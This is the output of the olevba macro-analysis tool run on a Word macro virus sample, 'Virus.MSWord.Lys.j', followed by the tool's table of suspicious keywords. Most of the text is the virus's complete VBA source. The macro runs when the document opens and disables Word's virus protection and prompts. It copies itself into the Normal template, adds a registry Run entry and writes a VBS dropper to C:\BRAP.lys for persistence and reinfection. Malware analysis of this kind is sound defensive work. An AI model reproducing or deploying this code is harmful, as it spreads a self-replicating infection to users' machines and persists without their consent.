olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lys.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Lys.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Options.VirusProtection = Int(Rnd * 0)
Options.SaveNormalPrompt = Int(Rnd * 0)
Options.ConfirmConversions = Int(Rnd * 0)
If ThisDocument = NormalTemplate Then Set TI = ActiveDocument Else Set TI = NormalTemplate
VM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Set IR = TI.VBProject.VBComponents.Item(1).CodeModule
IR.DeleteLines 1, IR.CountOfLines: IR.AddFromString VM
If TI = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.lys", "") = "VBSFile"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "BRAP") = "C:\BRAP.lys"
Open "C:\BRAP.lys" For Output As #1
Print #1, "Set wordobj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "BRAP = wscript.ScriptFullName"
Print #1, "Set NT = wordobj.NormalTemplate.VBProject.VBComponents.Item(1)"
Print #1, "NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines"
Print #1, "NT.CodeModule.AddFromFile BRAP"
Print #1, "NT.CodeModule.DeleteLines 1, 7"
Print #1, "wordobj.Quit"
Print #1, VM
Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

